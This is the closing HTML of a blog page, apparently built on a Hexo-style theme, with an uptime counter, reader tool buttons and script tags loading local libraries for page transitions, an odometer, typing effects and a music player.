                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="go-comment">
                <i class="fa-regular fa-comments"></i>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
            <i class="fa-regular fa-cog fa-spin"></i>
        </li>
        
            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    

</main>


    
<script src="/js/libs/Swup.min.js"></script>

<script src="/js/libs/SwupSlideTheme.min.js"></script>

<script src="/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>







<script src="/js/tools/imageViewer.js" type="module"></script>

<script src="/js/utils.js" type="module"></script>

<script src="/js/main.js" type="module"></script>

<script src="/js/layouts/navbarShrink.js" type="module"></script>

<script src="/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/layouts/categoryList.js" type="module"></script>





    
<script src="/js/tools/codeBlock.js" type="module"></script>




    
<script src="/js/layouts/lazyload.js" type="module"></script>




    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js" type="module"></script>







<div class="post-scripts" data-swup-reload-script>
    
        
<script src="/js/libs/anime.min.js"></script>

        
<script src="/js/tools/tocToggle.js" type="module"></script>

<script src="/js/layouts/toc.js" type="module"></script>

<script src="/js/plugins/tabs.js" type="module"></script>

    
</div>


    <div id="aplayer"></div>

<script src="/js/libs/APlayer.min.js"></script>


<script src="/js/plugins/aplayer.js"></script>


</body>
</html>
